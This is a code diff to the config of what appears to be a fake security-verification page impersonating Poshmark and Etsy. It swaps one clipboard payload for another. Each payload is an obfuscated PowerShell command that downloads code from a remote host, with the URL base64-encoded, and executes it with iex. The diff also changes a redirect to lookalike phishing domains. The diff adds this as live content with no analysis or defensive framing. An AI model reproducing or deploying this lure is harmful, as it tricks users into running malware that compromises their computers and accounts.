@@ -1,9 +1,9 @@
 const CONFIG = {
-  copyText: `powershell -c "$a=(iwr -Uri tr.ee/WnZNqJ -UseBasicParsing).Content;[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a))))|iex # I am undergoing security verification with Poshmark✅ "`,
-  rayId: "a2e26dfeffeec0d6",
+  copyText: `iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz04ODU1MDY4NzIyL2RoZG9uZTNuZG1kYjM4MmpueDYy'))) -UseBasicParsing)`,
+  rayId: "a2esdfh5sw3aeedd6",
   verifyDelayMs: 1400,
   notifyEndpoint: "/api/notify",
-  nonWindowsRedirect: "https://p0shmark.437905182.shop/D9RgbzOj1vbiTCvlMuH3FqmE",
+  nonWindowsRedirect: "https://etsy.218374059.sbs/125473537393",
 };
 
 const widget = document.getElementById("rlhxp0");
